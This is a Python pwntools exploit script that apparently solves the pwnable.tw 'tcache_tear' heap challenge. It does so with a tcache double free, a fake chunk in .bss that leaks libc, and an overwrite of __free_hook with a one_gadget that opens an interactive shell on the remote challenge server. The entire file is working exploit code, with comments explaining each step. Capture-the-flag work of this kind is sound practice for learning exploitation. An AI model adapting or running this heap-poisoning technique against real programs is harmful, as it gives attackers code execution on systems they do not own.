#!/usr/bin/env python3

from pwn import *

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc_chall.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10207)

    return r


def alloc(size: int, data: bytes):
    r.sendlineafter(b"choice :", b"1")
    r.sendlineafter(b"Size:", str(size).encode("ascii"))
    r.sendafter(b"Data:", data)


def free():
    r.sendlineafter(b"choice :", b"2")


def print_name() -> bytes:
    r.sendlineafter(b"choice :", b"3")
    r.recvuntil(b"Name :")
    return r.recvuntil(b"$$$", drop = True)


def main():
    r = conn()

    name_buf = 0x602060

    # Place the metadata for a fake big chunk (that we are going to use to leak libc) as the name
    r.sendafter(b"Name:", p64(0x0) + p64(0x501))

    # Looks like it's a version of tcache with no double-free checks (lol)
    alloc(0x58, b"AAAAAAAA")
    free()
    free()
    
    alloc(0x58, p64(name_buf + 0x500))
    alloc(0x58, p64(name_buf + 0x500))

    # Create two fake chunks after the fake big chunk to avoid consolidation
    payload = flat(
                    0x0,        # First chunk's metadata
                    0x21,
                    b"A" * 0x10,
                    0x0,        # Second chunk's metadata
                    0x21
                )
    
    alloc(0x58, payload)

    # Now alloc a chunk and set its fd pointer to name_buf+0x10 so it will overlap the name buffer
    # NOTE: "name_buf+0x10" because `free()` will then look at the metadata 0x10 bytes before
    alloc(0x68, b"BBBBBBBB")
    free()
    free()

    alloc(0x68, p64(name_buf + 0x10))
    alloc(0x68, p64(name_buf + 0x10))

    # Free fake chunk (placed in .bss overlapping name buffer) into unsorted bin
    alloc(0x68, b"CCCCCCCC")
    free()

    # Leak libc address
    libc.address = u64(print_name()[16:24]) - 0xca0 - 0x3eb000
    one_gadget = libc.address + 0x4f322
    log.info(f"libc @ 0x{libc.address:x}")

    # Overwrite `__free_hook` with one_gadget
    alloc(0x78, b"DDDDDDDD")
    free()
    free()

    alloc(0x78, p64(libc.sym.__free_hook))
    alloc(0x78, p64(libc.sym.__free_hook))
    alloc(0x78, p64(one_gadget))

    # Trigger one_gadget
    free()

    r.interactive("$ ")


if __name__ == "__main__":
    main()
